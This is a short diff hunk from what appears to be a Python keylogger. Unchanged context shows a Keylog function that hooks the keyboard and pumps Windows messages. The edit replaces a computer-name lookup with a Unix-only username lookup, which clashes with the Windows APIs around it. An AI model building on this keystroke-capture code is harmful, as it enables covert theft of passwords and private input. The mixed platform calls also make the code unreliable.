@@ -79,4 +79,4 @@ def Keylog(data):
   hooks_manager.HookKeyboard()
   pythoncom.PumpMessages()
 def getCPUname():
-  win32api.GetComputerName()
+    return pwd.getpwuid( os.getuid() )[ 0 ]
